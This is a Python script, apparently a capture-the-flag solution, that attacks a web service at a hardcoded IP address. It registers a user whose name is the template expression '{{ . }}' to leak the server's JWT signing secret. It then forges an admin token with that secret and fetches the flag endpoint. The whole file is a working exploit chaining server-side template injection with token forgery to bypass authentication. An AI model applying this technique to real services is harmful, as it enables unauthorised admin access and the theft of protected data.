import requests
import json
import jwt
URL = "http://34.146.226.125/"
data = {
	"id":"{{ . }}",
	"pw":"test"
}
# Register and login
requests.post(URL+"regist",data=data)
r = requests.post(URL+"auth",data=data)
token = json.loads(r.text)["token"]

# Leak the secret_key
header = {
	"X-Token":token
}
r = requests.get(URL,headers=header)
secret = r.text[33:-1]

# Encode the modify token with secret_key
token = jwt.encode({"id": "test","is_admin": True}, secret, algorithm="HS256")
header = {
	"X-Token":token
}
r = requests.get(URL+"flag",headers=header)
print(r.text)